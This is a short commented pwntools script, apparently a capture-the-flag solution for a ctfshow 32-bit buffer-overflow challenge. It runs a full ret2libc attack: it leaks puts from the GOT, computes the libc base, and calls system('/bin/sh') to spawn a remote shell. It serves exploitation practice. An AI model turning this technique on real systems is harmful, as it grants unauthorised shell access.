# -*- coding: utf-8 -*-

from pwn64 import *

elf_path = './pwn45'
elf = ELF(elf_path)
# 加载ELF（可执行和可链接格式）二进制文件到elf对象中，使我们能够轻松访问符号、地址和段

p = remote('pwn.challenge.ctf.show', 28289)

offset = 0x6B + 4
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
ctfshow = elf.sym['ctfshow']

payload = flat([cyclic(offset), puts_plt, ctfshow, puts_got])
#  flat函数将各个部分打平成一个字节序列
# 先调用puts函数并输出puts函数的实际地址（从GOT中获取），然后返回到ctfshow函数继续执行
p.sendline(payload)

puts_real = u32(p.recvuntil(b'\xf7')[-4:])
# 接收数据，直到遇到字节\xf7（在32位系统中，很多共享库（如libc）的地址高字节是\xf7）
# 取接收到的数据的最后 4 个字节，因为 puts 函数的地址是 32 位（4 个字节）
# 泄露 puts 函数在 GOT 表中的实际地址

libc = ELF("/home/ctfshow/libc/32bit/libc-2.27.so")
# 加载 libc 库
libc.address = puts_real - libc.symbols['puts']
# libc.symbols['puts'] 是 puts 函数在 libc 文件中的偏移地址，减去这个偏移地址，我们可以得到 libc 库在运行时的基地址

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
# 如果没有计算出 libc.address，那么 libc.symbols['system'] 和 libc.search(b'/bin/sh') 等操作将返回 libc 库中相应函数或字符串的偏移地址，而不是实际的内存地址

payload2 = flat([cyclic(offset), system, 0x0, bin_sh])
# 0x0作为占位符填充返回地址的后续字节，以确保返回地址被正确覆盖
p.sendline(payload2)

p.interactive()